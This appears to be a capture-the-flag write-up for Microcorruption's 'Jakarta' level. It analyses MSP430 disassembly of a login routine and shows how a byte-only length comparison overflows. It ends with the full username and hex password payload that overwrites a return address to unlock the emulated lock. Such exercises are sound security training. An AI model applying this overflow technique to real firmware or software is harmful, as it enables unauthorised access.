# For Jakarta in microcorruption

I analysed the assembly and found out 6 facts about it.
```
457e:  3e40 ff00      mov	#0xff, r14
4582:  3f40 0224      mov	#0x2402, r15
4586:  b012 b846      call	#0x46b8 <getsn>
```
1) The above gets the input for username. It reads 255 chars. However, afterwards, the lenth of the username is tested (see 0x4592 to 0x45a0). If its length >32 chars, the program ends. We can fill up to only 32 chars!
```
4592:  3f40 0124      mov	#0x2401, r15
4596:  1f53           inc	r15
4598:  cf93 0000      tst.b	0x0(r15)
459c:  fc23           jnz	#0x4596 <login+0x36>
459e:  0b4f           mov	r15, r11
45a0:  3b80 0224      sub	#0x2402, r11
.
.
.
45ae:  7b90 2100      cmp.b	#0x21, r11
45b2:  0628           jnc	#0x45c0 <login+0x60>
45b4:  1f42 0024      mov	&0x2400, r15
45b8:  b012 c846      call	#0x46c8 <puts>
45bc:  3040 4244      br	#0x4442 <__stop_progExec__>
```
2) `r15` records the memory addr of the last character of the username
`r11` then stores the number of characters entered as the username.
```
45c8:  3e40 1f00      mov	#0x1f, r14
45cc:  0e8b           sub	r11, r14
45ce:  3ef0 ff01      and	#0x1ff, r14
45d2:  3f40 0224      mov	#0x2402, r15
45d6:  b012 b846      call	#0x46b8 <getsn>
```
3) `r11` stores the number of characters entered as the usernme. `#0x1f` allows a max of 31 chars. `r14` stores the max number of chars that will be read as the password in the next getsn.
If 32 chars were inputted in the username, that means `r14=0x1ff`.
```
45e8:  0f5b           add	r11, r15
45ea:  b012 f446      call	#0x46f4 <strcpy>
```
4) Adding `r11` to `r15` gives us the next free memory address after the last char occupied by the username.
```
45fa:  3f80 0224      sub	#0x2402, r15
45fe:  0f5b           add	r11, r15
4600:  7f90 2100      cmp.b	#0x21, r15
4604:  0628           jnc	#0x4612 <login+0xb2>
```
5) `r15` records the total number of characters from the input (username and password combined). If the carry bit is not set (ie `0x21 >= r15`), then the password is accepted (ie the jump `jnc` is made). Otherwise the program is terminated.
```
446a:  0e12           push	r14
446c:  0f12           push	r15
446e:  3012 7d00      push	#0x7d
4472:  b012 6446      call	#0x4664 <INT>
4476:  5f44 fcff      mov.b	-0x4(r4), r15
```
6) `r14` has value `0x3fec` (which is the flag to override if passwd is correct) & `r15` has value `0x3ff2` (which is the address of the username+password string).
`r4` has value `0x3ff0`, meaning `mov.b	-0x4(r4), r15` moves value from mem addr `0x3fec` (the flag) to `r15`.

### Winning input

Username:
```aaaaaaaaaabbbbbbbbbbccccccccccdd```

Password:
```
656565654c44656565650f0f0f0f0f0f0f0f0f0f
0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f
0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f
0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f
0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f
0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f
0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f
0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f
0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f
0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f
0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f
0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f
0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f
```

This gives us a value of `0x120` (meaning 288 characters. 32 from the username, 256 from the password) in `r15` in part 5. Since we are comparing bytes however, `cmp.b	#0x21`, we are essentially doing `0x21-0x20` (0x20 is the least significant byte from 0x120), and that does *not* set the carry bit.

END

